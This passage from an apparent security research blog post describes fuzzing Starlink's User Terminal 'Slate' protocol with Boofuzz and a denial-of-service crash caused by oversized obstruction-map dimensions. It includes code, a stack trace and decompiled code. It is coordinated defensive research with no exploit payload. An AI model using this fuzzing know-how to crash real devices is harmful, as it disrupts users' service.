        <span>self</span><span>.</span><span>_curr</span> <span>=</span> <span>0</span>

    <span>def</span> <span>encode</span><span>(</span><span>self</span><span>,</span> <span>value</span><span>:</span> <span>bytes</span> <span>=</span> <span>None</span><span>,</span> <span>mutation_context</span><span>=</span><span>None</span><span>)</span> <span>-&gt;</span> <span>bytes</span><span>:</span>
        <span>curr</span> <span>=</span> <span>self</span><span>.</span><span>_curr</span>
        <span>self</span><span>.</span><span>_curr</span> <span>+=</span> <span>1</span>
        <span>return</span> <span>int</span><span>.</span><span>to_bytes</span><span>(</span><span>curr</span><span>,</span> <span>length</span><span>=</span><span>8</span><span>,</span> <span>byteorder</span><span>=</span><span>"big"</span><span>)</span>
</code></pre></div>

<p>Once the message structure has been defined, the fuzzer can use the code from the Slate injector to send the messages.
The only component that needs to be implemented at this point is something that can detect if a program has crashed after a message was sent.
At first, we were issuing the <code>pgrep</code> command through SSH, but this was adding an overhead that was slowing the fuzzer.
So we've implemented a simple script that runs on the dish, opening a TCP socket and waiting for a connection which will then be used to directly communicate with the fuzzer.
The part of the process monitor that will run on the client (fuzzer machine) can be integrated into the fuzzer, by inheriting Boofuzz's <code>BaseMonitor</code> and implementing its methods, such as <code>alive</code> (check if the target process is still alive) and <code>restart_target</code> (restart the target process).
The resulting architecture is shown in the following figure.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/slate-fuzzer.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/slate-fuzzer.png" width="80%">
    </a>
</center>
<p>Some crashes were found by fuzzing the <code>control_to_frontend</code> protocol but none of them appeared to be exploitable in ways other than simply crashing the program, causing a Denial of Service for the frontend applications.
This is because the frontend process is a Go binary and the Go runtime makes the process crash (through the <code>panic</code> function) because it detects that something fishy is going on.</p>
<p>As an example, the following are the details of one of these crashes.
In the following snippet, you can see part of the stack trace produced by the Go runtime upon the crash, from which you can understand that the crash is caused by the function <code>UpdateObstructionMap</code>, which tries to allocate too much memory.</p>
<div><pre><span></span><code><span>fatal</span><span> </span><span>error</span><span>:</span><span> </span><span>runtime</span><span>:</span><span> </span><span>out</span><span> </span><span>of</span><span> </span><span>memory</span><span></span>

<span>goroutine</span><span> </span><span>5</span><span> </span><span>[</span><span>running</span><span>]</span><span>:</span><span></span>
<span>[</span><span>...</span><span>]</span><span></span>
<span>runtime</span><span>.(</span><span>*</span><span>mheap</span><span>).</span><span>alloc</span><span>(</span><span>0x5046800</span><span>?</span><span>,</span><span> </span><span>0x28234</span><span>?</span><span>,</span><span> </span><span>0xd0</span><span>?</span><span>)</span><span></span>
<span>[</span><span>...</span><span>]</span><span></span>
<span>main</span><span>.(</span><span>*</span><span>DishControl</span><span>).</span><span>UpdateObstructionMap</span><span>(</span><span>0x40003be000</span><span>,</span><span> </span><span>{</span><span>0x7a90f8</span><span>?</span><span>,</span><span> </span><span>0x4000580380</span><span>?</span><span>}</span><span>)</span><span></span>
<span>[</span><span>...</span><span>]</span><span></span>
</code></pre></div>

<p>By inspecting further this function, we understood how the obstruction map is transferred to the frontend process.
First of all, the obstruction map is a 3D map of the sky above the antenna, indicating whether the antenna has a clear view of the sky or is obstructed by an obstacle such as a tree or other buildings, that the user can see from the frontend applications.
This map is not produced by the frontend process, thus it has to be sent to it through Slate messages.</p>
<div><pre><span></span><code>obstruction_map.config.num_rows                                                 uint32
obstruction_map.config.num_cols                                                 uint32
obstruction_map.current.obstructed                                              bool
obstruction_map.current.index                                                   uint32
</code></pre></div>

<p>In the snippet above you can see part of the message structure definition that carries information about the obstruction map.
The obstruction map is represented in memory as a matrix, in which each point can be obstructed or not.
The control process sends this information by sending one Slate message for each point in the matrix, by setting the right <code>index</code> and setting <code>obstructed</code> to <code>true</code> or <code>false</code>.
The size of the matrix is not fixed, and its dimensions can be set by the control process by using the <code>num_rows</code> and <code>num_cols</code> fields in the message.
This is where the bug resides, in fact when sending big values in these two fields, the program tries to allocate enough memory for the matrix and panics for this reason.</p>
<div><pre><span></span><code><span>len</span><span> </span><span>=</span><span> </span><span>ObstructionMapConfigNumCols</span><span> </span><span>*</span><span> </span><span>ObstructionMapConfigNumRows</span><span>;</span><span></span>
<span>if</span><span> </span><span>(</span><span>len</span><span> </span><span>==</span><span> </span><span>(</span><span>this</span><span>-&gt;</span><span>obstructionMap</span><span>).</span><span>snr</span><span>.</span><span>__count</span><span>)</span><span></span>
<span>    </span><span>goto</span><span> </span><span>LAB_0050b7f4</span><span>;</span><span></span>
<span>(</span><span>this</span><span>-&gt;</span><span>obstructionMap</span><span>).</span><span>numRows</span><span> </span><span>=</span><span> </span><span>ObstructionMapConfigNumRows</span><span>;</span><span></span>
<span>(</span><span>this</span><span>-&gt;</span><span>obstructionMap</span><span>).</span><span>numCols</span><span> </span><span>=</span><span> </span><span>ObstructionMapConfigNumCols</span><span>;</span><span></span>
<span>puVar5</span><span> </span><span>=</span><span> </span><span>runtime</span><span>.</span><span>makeslice</span><span>(</span><span>&amp;</span><span>datatype</span><span>.</span><span>Float32</span><span>.</span><span>float32</span><span>,</span><span>len</span><span>,</span><span>len</span><span>);</span><span></span>
</code></pre></div>

<p>The snippet above shows the decompiled and annotated code of the frontend binary which handles the size of the obstruction upon the reception of a slate message.
Line 1 computes the size of the matrix and line 2 compares it with the current size of the matrix the program has in memory, if the two differ then the dimensions are updated in the internal memory structure on Lines 4 and 5, and then the new matrix is allocated using the <code>makeslice</code> method of the Go runtime on Line 6.
As you can see, no checks are performed on the size to be allocated, nor on the result of the multiplication between the two given dimensions.
This would be very dangerous in C, but the Go runtime handles all the corner cases automatically, by checking that the size of the asked memory is positive and not too big.
The Go runtime also checks every array access, otherwise, an arbitrary write would probably be possible by playing with the index and the size of the matrix.</p>
<p>Note that this bug can only be triggered by sending crafted UDP packets to a service bound to localhost only.
Therefore it is not possible to trigger it from an external network.
Additionally, the <code>iptables</code> configuration of the UT filters out incoming UDP packets, so spoofing packets with a localhost source IP would not work either.
Therefore we did not consider this a vulnerability but merely a bug.</p>
<p>After we implemented the fuzzer and used it in the emulator, we were provided a rooted UT by Starlink, then we confirmed the presence of the aforementioned bug on a real device and fuzzed some more processes that weren't working in the emulator.</p>
<h2>Conclusion</h2>
<p>You can find more details in my master's thesis which will be published at the end of this year, stay tuned!
The presented tools and script can be found in <a href="https://github.com/quarkslab/starlink-tools/">this repo</a>.</p>
<p>This work and the tools we have published are meant to be reused for further research on Starlink's User Terminal.
Unfortunately, due to some technical issues and time constraints, we did not manage to fully inspect the network stack and protocols used in the satellite communications, but hopefully, this knowledge base of the higher-level management function of the runtime can be used in the future to assist in that effort.</p>
<p>I encourage research on this topic also because SpaceX's security team is there to help you and they offer some <a href="https://bugcrowd.com/spacex">juicy bounties</a>.</p>
<p>Many thanks to:</p>
<ul>
<li>Maxime Rossi Bellom, my internship tutor, for guiding me in this research.</li>
<li>Lennert Wouters, who was the author of the blog post regarding the dumping of the firmware and the fault injection attack of Starlink's User Terminal, for helping us in the early stages of this research.</li>
<li>Tim Ferrell, from SpaceX's security team, for sending us a testing dish with root access.</li>
<li>Ivan Arce, Salwa Souaf and Guillaume Valadon for reviewing my blog post.</li>
<li>Many other amazing colleagues for helping me on topics in their fields of expertise.</li>
</ul>

<hr><p>

If you would like to learn more about our security audits and explore how we can help you, <a href="https://content.quarkslab.com/talk-to-our-experts-blog">get in touch with us</a>!

</p></div></div>]]></description>
        </item>
    </channel>
</rss>